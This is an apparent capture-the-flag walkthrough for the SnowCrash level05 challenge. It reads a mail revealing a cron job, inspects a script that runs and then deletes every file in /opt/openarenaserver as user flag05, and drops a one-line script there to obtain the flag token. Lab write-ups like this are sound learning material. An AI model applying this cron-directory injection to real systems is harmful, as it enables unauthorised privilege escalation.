As you log in you can see that `you have new mail`
Mails are stored into /var/mail/$USER

```
level05@SnowCrash:~$ cat /var/mail/$USER
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

you can see that the mail contain a cron task
We can assume that this cron task is in use, but can't check it's veracity by doing `crontab -l -u flag05` because we haven't the right to see this user crontab


by looking at the cron task we can see that every 2minutes the script /usr/sbin/openarenaserver is executed by flag05

let's see what's inside /usr/sbin/openarenaserver

```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
```

It execute every scripts into /opt/openarenaserver and delete it.

Let's build an exploit

`echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && sleep 180 && cat /tmp/flag && echo -ne '\007'`

this will put a file into the /opt/openarenaserver wait 3min to be sure, print it and do a bell song after to notify you

and we got the flag

```
level05@SnowCrash:~$ echo 'getflag > /tmp/flag' > /opt/openarenaserver/exploit && sleep 180 && cat /tmp/flag && echo -ne '\007'
Check flag.Here is your token : viuaaale9huek52boumoomioc
